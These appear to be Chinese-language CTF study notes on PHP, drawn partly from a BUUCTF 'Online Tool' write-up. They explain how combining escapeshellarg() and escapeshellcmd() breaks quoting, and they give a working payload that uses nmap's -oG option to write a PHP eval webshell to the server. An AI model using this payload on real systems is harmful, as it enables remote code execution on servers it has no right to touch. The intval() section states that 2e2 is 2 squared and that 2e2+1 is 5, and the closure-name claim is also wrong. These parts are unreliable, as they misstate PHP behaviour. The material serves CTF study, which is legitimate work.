
# escapeshellarg()和escapeshellcmd()
出自：[BUUCTF-Web-[BUUCTF 2018]Online Tool | 半枫](https://startluck.github.io/2025/08/16/Online-Tool/)

**这两个是PHP中用于安全处理命令行参数的函数，但它们的组合使用有时会产生意外的结果，两个组合一起就会产生安全隐患。

#### [](https://startluck.github.io/2025/08/16/Online-Tool/#escapeshellarg "escapeshellarg()")escapeshellarg()

**功能：**将字符串转义为安全的shell参数  
**特点：**  
在整个字符串周围添加单引号  
将字符串中已有的单引号转义为 `'\''`（先关闭引号，转义单引号，再打开引号）  
确保字符串被当作一个整体参数传递

简单案例：

|                                                                                                                                                                                                                                                                     |     |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| \$input = "it's";  <br>echo escapeshellarg($input);  <br>处理过程：  <br>1.包裹外层引号 → 'it's'  <br>2.转义内部单引号：  <br>    在 ' 前关闭引号 → 'it'  <br>    插入转义单引号 → '\''  <br>    重新打开引号 → 's'  <br>3.最终结果 → 'it'\''s'  <br>  <br>Bash解析时：  <br>'it' + \' + 's'  <br>合并后仍是原始字符串 it's |     |

#### [](https://startluck.github.io/2025/08/16/Online-Tool/#escapeshellcmd "escapeshellcmd()")escapeshellcmd()

**功能：**转义shell元字符  
**特点：**

转义以下字符：#&;|*?~<>^()[]{}$`、换行符和回车符  
不添加引号  
主要用于转义整个命令中的特殊字符  
实例：

|                                                                                     |
| ----------------------------------------------------------------------------------- |
| \$input = "hello;world";  <br>echo escapeshellcmd($input);  <br>// 输出: hello\;world |

#### [](https://startluck.github.io/2025/08/16/Online-Tool/#%E4%B8%A4%E4%B8%AA%E4%B8%80%E8%B5%B7%E7%BB%84%E5%90%88%E5%A6%82%E4%BD%95%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E "两个一起组合如何产生漏洞")两个一起组合如何产生漏洞

当这两个函数组合使用时（特别是先escapeshellarg再escapeshellcmd），可能会产生漏洞：

|                                                                                                                                                                                                                                               |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| \$input = "' <?php code ?> -oG evil.php '";  <br>\$arg = escapeshellarg($input);   <br>// 结果: ''\'' <?php code ?> -oG evil.php '\'''  <br>  <br>\$cmd = escapeshellcmd($arg);  <br>// 结果: ''\\\\'' \<\\?php code \\?\\> -oG evil.php '\\\\''' |

**Bash解析时的行为：**  
1.开头处：`''\\''` 被解析为字面字符串 `\`  
开头的`''`是空字符串  
`\\`被解释为字面反斜杠  
`''`又是空字符串  
2.中间的 `<?php code ?> -oG evil.php`因引号被破坏而成为独立参数  
3.末尾：最后的`'`→ 可能被忽略或与后续内容关联  
`'\\'''` 可以拆解为以下部分：  
`'\\'` → 单引号包裹的两个反斜杠  
`''` → 空字符串  
`'` → 未闭合的单引号（实际会与后续内容关联）

### [](https://startluck.github.io/2025/08/16/Online-Tool/#%E6%9E%84%E9%80%A0payload "构造payload")构造payload

|   |
|---|
|?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '|

nmap有一个参数-oG可以实现将命令和结果写到文件，  
将一句话木马写入`hack.php`文件中，相当于传入一个木马文件，  
当这个字符串被拼接到nmap命令中时：

|   |
|---|
|nmap -T5 -sT -Pn --host-timeout 2 -F ''\\'' <?php @eval($_POST["hack"]);?> -oG hack.php '\\'''|

转义后的字符串在Bash中解析时，PHP代码部分会被当作普通参数传递给nmap，  
nmap的-oG选项允许将结果输出到文件，结合PHP标签可以创建webshell**


# intvla()

这个函数是强制转换为int类型

在php7.0及以下版本
intval($num)

当我们传入2e2正常为2的平方

但是intvla会只拿e前的内容也就是2


但是 intval($num + 1)

就会先解析$num的科学计数法

2e2+1=5



# 在 PHP 的 Apache 进程中，匿名函数（Closure）的默认名称是什么？
PHP 内部会为 匿名函数 生成默认名称，而这个名称格式与 Zend 引擎 相关。具体来说：

匿名函数（Closure） 在内部表示时，默认名称是 \x00lambda_%d
其中 \x00（NULL 字符）是 PHP 内部的作用域分隔符
%d 是一个递增的编号（每个匿名函数都有唯一的 ID）
示例代码（使用 ReflectionFunction 获取匿名函数的内部名称）：

```php
$func = function() {};
 
$reflector = new ReflectionFunction($func);
 
echo $reflector->getName();
```
 输出

`\x00lambda_1`